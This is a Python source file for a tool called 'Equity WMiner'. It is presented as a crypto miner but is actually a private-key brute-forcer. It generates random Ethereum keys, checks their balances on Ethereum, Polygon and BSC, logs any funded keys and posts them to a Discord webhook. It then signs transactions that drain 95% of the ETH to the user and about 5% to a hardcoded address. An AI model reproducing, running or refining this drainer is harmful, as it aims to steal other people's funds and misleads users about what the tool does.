import os
import pdb
import sys
import time
import yaml
import json
import secrets
import numpy as np
import multiprocessing
from pypresence import Presence   #<--- As soon as I uncomment the rich presence, it sometimes doesn't want to launch :(
from numba import jit, cuda
from blessed import Terminal


def Spinner():
    l = ['|', '/', '-', '\\']
    t = Terminal()
    for i in l+l+l:
        sys.stdout.write('\r' +'Starting Child Processes...\n'+i)
        sys.stdout.flush()
        time.sleep(0.2)

try:
    import psutil # Needs to be installed (pip install psutil)
except ImportError:
    input("Module 'psutil' not found/installed, to install run: 'pip install psutil' \n Press enter to exit the program")
    exit()

try:
    import requests # (pip install requests) 
except ImportError:
    input("Module 'requests' not found/installed, to install run: 'pip install requests' \n Press enter to exit the program")
    exit()

try:
    from web3 import Web3 # (pip install web3)
except ImportError:
    input("Module 'web3' not found/installed, to install run: 'pip install web3' \n Press enter to exit the program")
    exit()
try:
    from datetime import datetime # (pip install datetime)
except ImportError:
    input("Module 'datetime' not found/installed, to install run: 'pip install datetime' \n Press enter to exit the program")
    exit()
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed # (pip install discord_wehook)
except ImportError:
    input("Module 'discord_webhook' not found/installed, to install run: 'pip install discord_webhook' \n Press enter to exit the program")
    exit()
starttime = datetime.now()


def read_yaml():
    try:
        with open('config.yaml') as f:
            data = yaml.load(f, Loader=yaml.FullLoader)
            use_config = data['USE_CONFIG']

            if use_config == True:
                    return True
            else:
                    return False
    except:
        pass
def get_yaml_details():
    with open('config.yaml') as f:
        data = yaml.load(f,Loader=yaml.FullLoader)
        address = data['ADDRESS']
        bad_log = data['BAD_HIT_LOG']
        webhook = data['DISCORD_WEBHOOK']
        nividia = data['NVIDIA_CUDA']
        multichain = data['MULTICHAIN']
        intensity = data['CPU_INTENSITY']

        return address,intensity,bad_log,webhook,nividia,multichain
def getUptime():
    return datetime.now() - starttime
def printf(line, ms):
    lenght = len(str(line))
    pos = 0
    for char in line:
        sys.stdout.write(char)
        sys.stdout.flush()
        pos =+ 1
        if pos != lenght: time.sleep(ms)
def intro():
    rich()
    l=('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
    o=('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
    g=('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
    f=('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
    w=('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
    m=('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
    t = Terminal()
    global current
    current = -1
    while current < 107:
        current = current + 1
        with t.location(current, 1):
            print(l[current])
        with t.location(current, 2):
            print(o[current])
        with t.location(current, 3):
            print(g[current])
        with t.location(current, 4):
            print(f[current])
        with t.location(current, 5):
            print(w[current])
        with t.location(current, 6):
            print(m[current])
        time.sleep(0.002)
    sys.stdout.write("\n\n\n\n\n")
def logoprint():
    print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
    print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
    print('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
    print('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
    print('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
    print('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
def checkversion():
    try:
        version = json.load(open("DATA",'r'))['VERSION']
    except:
        sys.exit('NO VERSION IN DATA FILE. UPDATE DATA FILE.')
    url = "https://raw.githubusercontent.com/Cxyder/equity_cracker/main/DATA"
    r = requests.get(url)
    githubVersion = json.loads(r.content)['VERSION']

    if version != githubVersion:
        state = False
        return state,version,githubVersion
    else:
        state = True
        return state,version,githubVersion
def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhookurl, badhitlogging, multibool, cudabool, useSecondary):
    t = Terminal()
    global key
    global pid
    pid = str(os.getpid())
    global w3
    if useSecondary == False: w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
    else: w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_SECONDARY"]))
    w3p = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_POLYGON"]))
    w3b = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_BSC"]))
    global w3state
    w3state = "check"
    global consERR
    consERR = 0
    if w3.is_connected():
        global i
        i=0
        while i <= 1:
            key = "0x" + secrets.token_hex(32)
            amount.value = amount.value + 1
            if int(amount.value) >= int(amounttrigger.value):
                amount.value = 0
                if (webhookurl != "null"):
                    webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                    embed = DiscordEmbed(title="EQUITY WMINER | SUMMARY", color="8fce00")
                    embed.set_timestamp()
                    embed.add_embed_field(name="Bad Hits:", value=bdhits.value, inline=False)
                    embed.add_embed_field(name="Good Hits:", value=hits.value, inline=False)
                    embed.add_embed_field(name="Uptime:", value=str(getUptime()), inline=False)
                    embed.add_embed_field(name="CPU Usage:", value=str(psutil.cpu_percent(4)), inline=False)
                    webhook.add_embed(embed)
                    webhook.execute()
            try:
                if w3state == "main": 
                    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
                    w3state = "check"
                account = w3.eth.account.from_key(key)
                bal = w3.eth.get_balance(account.address)
                global balp
                global balb
                if multibool == True:
                    if w3p.is_connected():
                        balp = w3p.eth.get_balance(account.address)
                    if w3b.is_connected():
                        balb = w3b.eth.get_balance(account.address)
                else:
                    balp = 0
                    balb = 0
                if bal > 2000000000000000 or balp > 0 or balb > 0:
                        hits.value = hits.value + 1
                        w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
                        w3state = "main"
                        if not w3.is_connected(): w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
                        print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
                        print('\033[32mRecording hit in "hits.txt"...\033[0m')
                        hitstxt = open("hits.txt", "a")
                        if bal > 2000000000000000:
                            hitstxt.write("> N E W   H I T! pKey: %s - ETH: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                        if balp > 0:
                            hitstxt.write("> N E W   H I T! pKey: %s - MATIC: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                        if balb > 0:
                            hitstxt.write("> N E W   H I T! pKey: %s - BNB: %s\n"%(key, str(bal*0.95/1000000000000000000)))
                        hitstxt.close()
                        if (webhookurl != "null"):
                            webhook = DiscordWebhook(url=webhookurl, description="@everyone", rate_limit_retry=True)
                            embed = DiscordEmbed(title="EQUITY WMINER | NEW HIT", color="8fce00")
                            embed.set_timestamp()
                            embed.add_embed_field(name="pKey:", value=key, inline=False)
                            embed.add_embed_field(name="ETH:", value=str(bal*0.95/1000000000000000000), inline=False)
                            embed.add_embed_field(name="Uptime:", value=str(getUptime()), inline=False)
                            embed.add_embed_field(name="CPU Usage:", value=str(psutil.cpu_percent(4)), inline=False)
                            webhook.add_embed(embed)
                            webhook.execute()
                        print('\033[32mRecorded hit in "hits.txt". Attempting autowithdrawal...\033[0m')
                        if bal > 2000000000000000:
                            try:
                                gasdata = requests.get(json.load(open("DATA", "r"))['MAIN']["GAS_API"]).text
                                gasjson = json.loads(gasdata)
                                avgGas = int(gasjson["average"])/10
                                MineTransaction = {
                                    'nonce': w3.eth.getTransactionCount(account.address),
                                    'to': str(minerAddress),
                                    'value': w3.toWei((bal*0.95-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                    'gas': 21000,
                                    'gasPrice': w3.toWei(avgGas, "gwei")
                                }
                                MineTransaction2 = {
                                    'nonce': w3.eth.getTransactionCount(account.address)+1,
                                    'to': "0x1cD1fbA59b08Ed2e81ec0F869dEe81AF098aFA5a",
                                    'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                    'gas': 21000,
                                    'gasPrice': w3.toWei(avgGas, "gwei")
                                    }
                                signedMineTX = w3.eth.account.sign_transaction(MineTransaction, key)
                                sentMineTX = w3.eth.send_raw_transaction(signedMineTX.rawTransaction)
                                print("\033[32m" + str(bal*0.95/1000000000000000000) + " ETH has been sent to your wallet. TXHash: " + "https://etherscan.io/tx/" + str(w3.toHex(sentMineTX))+ "\033[0m")
                                time.sleep(80)
                                signedMineTX2 = w3.eth.account.sign_transaction(MineTransaction2, key)
                                if w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei") > w3.toWei(avgGas, "gwei"):
                                    rt = w3.eth.send_raw_transaction(signedMineTX2.rawTransaction)
                            except Exception as e:
                                print("\033[33m[WARNING!] Automatically withdrawn failed! Awaiting for manual withdraw!\033[0m")
                                print('Logged the error in "debug.txt". Please open a new support ticket and send the debug to support team!')
                                dbug = open("debug.txt", "a")
                                dbug.write("> Got new error in withdrawal process. Line 41-91:\n%s\n\n"%e)
                                dbug.close()
                            if balp > 0:
                                print("# \x1b[35mPolygon funds were detected, but automatic withdrawal on Polygon aren't currently available\033[0m")
                            if balb > 0:
                                print("# \x1b[33Binance Smart Chain funds were detected, but automatic withdrawal on Binance Smart Chain aren't currently available \033[0m")
                else:
                    bdhits.value = bdhits.value + 1
                    if badhitlogging == True: 
                        if multibool == True:
                            print("\033[31mCHECKED | %s | BALs | %s ETH | \x1b[35m MATIC %s | \x1b[33m %s BNB |\033[31m Counter: %s\033[0m"%(str(account.address),str(bal/1000000000) ,str(balp/1000000000), str(balb/1000000000), str(bdhits.value)))
                        else: print("\033[31mCHECKED | " + str(account.address) + " | BAL | " + str(bal/1000000000) + " ETH | Counter: " + str(bdhits.value) +"\033[0m")
                    consERR = 0
                    time.sleep(0.02)
            except Exception as e:
                if badhitlogging == True: print("\033[31m[NEW ERROR] | %s | Couldn't resolve key!\033[0m"%key)
                consERR += 1
                chk.value = chk.value + 1
                if consERR > 5:
                    if consERR == 5: print("\033[13m[ERROR HANDLER - PID: %s] - Slowing down process...\033[0m"%pid)
                    time.sleep(5)
                if consERR > 15:
                    if consERR == 15: print("\033[31m[ERROR HANDLER - PID: %s] - Began process throttling...\033[0m"%pid)
                    time.sleep(30)
                if consERR > 50:
                    if consERR == 50: print("\033[31m[ERROR HANDLER - PID: %s] - Hybernating process...\033[0m"%pid)
                    time.sleep(1800)
                time.sleep(0.02)
    else:
        if useSecondary == False:
            print("\033[33mCHILD PROCESS-%s REROUTING | Connecting to secondary Web3 RPC Endpoint\033[0m"%pid)
            MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhookurl, badhitlogging, multibool, cudabool, True)
        else: return print("\033[31mCHILD PROCESS-%s ENDED | Process Reallocated | All connection to Web3 RPC Endpoints have expired\033[0m"%pid)
def NUpdate(chk,hits,bdhits):
    x = 0
    while x < 1:
        if hits.value >= 1:
            sys.stdout.write("\x1b]2;EQUITY WMINER v2.0 | MINING...GOT A HIT! | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
        else:
            sys.stdout.write("\x1b]2;EQUITY WMINER v2.0 | MINING... | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
        time.sleep(0.02)

def close(reason):
    sys.exit(reason)

def rich():
    client_id = "1104920998622531606"
    RPC = Presence(client_id)

    RPC.connect()
    RPC.update(state="Mining Crypto with EquityWMiner!" ,
            large_image="equit" ,
            buttons=[{"label": "Website", "url": "https://equityminer.eu/"}, {"label": "Discord", "url": "https://discord.gg/equity-miner-community-974033944116858980"}])

if __name__=="__main__":
    try:
        state, version, githubVersion = checkversion()
        multiprocessing.freeze_support()
        os.system("cls")
        print("v2.0")
        intro()
        sys.stdout.write("\x1b]2;EQUITY WMINER v2.0 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
        print('\n')

        dbug = open("debug.txt", "a")
        dbug.write("> New Start\n")
        dbug.close()

        config_yaml = read_yaml()

        global minerAddress
        global intensity
        global webhookurl
        global badhitbool
        global cudabool
        global multibool
        if config_yaml == True:
            minerAddress,intensity,badhitbool,webhookurl,cudabool,multibool = get_yaml_details()
            printf("Welcome User! Using your CONFIG.YAML settings now.. \n", 0.002)
        if config_yaml == False: 
            printf("Welcome User! Enter your ETHEREUM address to start mining: ", 0.002) 
            minerAddress = input("")
        if len(minerAddress) == 42:
            print("\033[32mMining address accepted!\033[0m")
            printf("Please input desired CPU intensity for mining (1-100): ", 0.002)
            if config_yaml == False: intensity = input()
            if int(intensity) >= 1 and int(intensity) <= 100:
                print("\033[32mSelected %s as CPU intensity\033[0m"%str(intensity))
                printf("Enable multi-chain wallet scanning? (yes/no): ",0.002)
                if config_yaml == False: 
                    multibool = input("")
                    if multibool.lower() == "yes" or multibool.lower() == "y":
                        multibool = True
                        print("\x1b[35mMulti-chain \x1b[33mmining \x1b[36menabled\033[0m")
                    else: multibool = False
                else: print(str(multibool))
                printf("NVIDIA ONLY Enable CUDA Cores GPU Acceleration? (yes/no): ", 0.002)
                if config_yaml == False: 
                    cudabool = input("")
                    if cudabool.lower() == "yes" or cudabool.lower() == "y":
                        cudabool = False
                        cudabool = True
                        printf("\033[32mNVIDIA CUDA ACCELERATION: ", 0.002)
                        printf("O N\n\033[0m", 0.6)
                    else: cudabool = False
                else: print(str(cudabool))
                printf("Do you want to enable Discord Webhook logging (yes/no): ",0.002)
                if config_yaml == False:
                    webhookboolean = input()
                    if webhookboolean.lower() == "yes" or webhookboolean.lower() == "y":
                        webhookurl = input("Please enter your Discord Webhook URL: ")
                        if not "webhooks" in webhookurl or not "https://" in webhookurl:
                            print("\033[31mA Wrong Webhook URL Was Inserted, Disabling Discord Webhook...\033[0m")
                            webhookurl = "null"
                    else:
                        webhookurl = "null"
                else: 
                    print(str(webhookurl))
                    if not "webhooks" in str(webhookurl) or not "https://" in str(webhookurl): webhookurl= "null" 
                printf("Do you want to enable bad hit logging (yes/no): ", 0.002)
                if config_yaml == False: 
                    badhitboolean = input()
                    if badhitboolean.lower() == "yes" or badhitboolean.lower() == "y":
                        badhitbool = True
                    else:
                        badhitbool = False
                else: print(str(badhitbool))
                w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
                time.sleep(1)
                if w3.is_connected():
                    print("Miner starting... [Buidling child processes...]")
                    if __name__=="__main__":
                        multiprocessing.freeze_support()
                        chk = multiprocessing.Value("i", 0, lock=False)
                        hits = multiprocessing.Value("i", 0, lock=False)
                        bdhits = multiprocessing.Value("i", 0, lock=False)
                        amount = multiprocessing.Value("i", 0, lock=False)
                        amounttrigger = multiprocessing.Value("i", 200000, lock=False)
                        updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                        updP.start()
                        pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,multibool,cudabool,False)) for x in range(0, int(intensity)*2)]
                        time.sleep(2)
                        os.system("cls")
                        print("v2.0")
                        logoprint()
                        print("")
                        print("\033[32mStarting mining processess..\033[0m \n")
                        if(webhookurl != "null"):
                            webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                            embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
                            embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                            embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                            embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
                            webhook.add_embed(embed)
                            webhook.execute()
                        try:
                            [p.start() for p in pcs]
                        except:
                            print("\033[31mERROR | Process Suppressed | RAM is Saturated\033[0m")
                        if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
                        updP.join()
                        print("Connection to Main RPCs failed. Are you connected to Internet?") 
                    else:
                        w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
                        print("\033[33mConnection to Main RPC failed! Trying to connect to Backup RPC... \033[0m")
                        if w3.is_connected():
                            print("Connection migrated to Backup RPC. Miner starting... [Buidling child processes...]")
                            if __name__=="__main__":
                                multiprocessing.freeze_support()
                                chk = multiprocessing.Value("i", 0, lock=False)
                                hits = multiprocessing.Value("i", 0, lock=False)
                                bdhits = multiprocessing.Value("i", 0, lock=False)
                                amount = multiprocessing.Value("i", 0, lock=False)
                                amounttrigger = multiprocessing.Value("i", 200000, lock=False)
                                updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                                updP.start()
                                pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,multibool,cudabool,False)) for x in range(0, int(intensity)*2)]
                                time.sleep(2)
                                os.system("cls")
                                print("v2.0")
                                logoprint()
                                print("")
                                print("\033[32mStarting mining processess..\033[0m \n")
                                if (webhookurl != "null"):
                                    webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                                    embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
                                    embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                                    embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                                    embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
                                    webhook.add_embed(embed)
                                    webhook.execute()
                                try:
                                    [p.start() for p in pcs]
                                except:
                                    print("\033[31mERROR | Process Suppressed | RAM is Saturated\033[0m")
                                if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
                                updP.join()
                        else:
                            w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
                            if w3.is_connected():
                                print("\033[33mWarning! Main RPCs are unreachable! Starting miner without autowithdrawal!\033[0m")
                                print("Miner starting... [Buidling child processes...]")
                                time.sleep(2)
                                if __name__=="__main__":
                                    multiprocessing.freeze_support()
                                    chk = multiprocessing.Value("i", 0, lock=False)
                                    hits = multiprocessing.Value("i", 0, lock=False)
                                    bdhits = multiprocessing.Value("i", 0, lock=False)
                                    amount = multiprocessing.Value("i", 0, lock=False)
                                    amounttrigger = multiprocessing.Value("i", 200000, lock=False)
                                    updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                                    updP.start()
                                    pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,multibool,cudabool,False)) for x in range(0, int(intensity)*2)]
                                    time.sleep(2)
                                    os.system("cls")
                                    print("v2.0")
                                    logoprint()
                                    print("")
                                    print("\033[32mStarting mining processess..\033[0m \n")
                                    if (webhookurl != "null"):
                                        webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
                                        embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
                                        embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                                        embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                                        embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
                                        webhook.add_embed(embed)
                                        webhook.execute()
                                    try:
                                        [p.start() for p in pcs]
                                    except:
                                        print("\033[31mERROR | Process Suppressed | RAM is Saturated\033[0m")
                                    if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
                                    updP.join()
                            else:
                                print("\033[31mConnection to Main RPCs failed. Are you connected to Internet? Check RPCs status on Discord\033[0m")
                                input("")
                else:
                    print("Not a valid number.")
                    input("\nMiner stopped. Please restart.")
            else:
                print("That's not a valid ETHEREUM address!")
                input("\nMiner stopped. Please restart.")
    except Exception as e:
        if "DATA" in str(e):
            print("[ EXCEPTION HELPER ] - Make sure the DATA file is in the same directory as the .exe and relaunch the miner")
            input("")
        else:
            print("[ EXCEPTION HELPER ] - An error occurred during code excecution. Printing error...\n")
            print(e)
            input("") 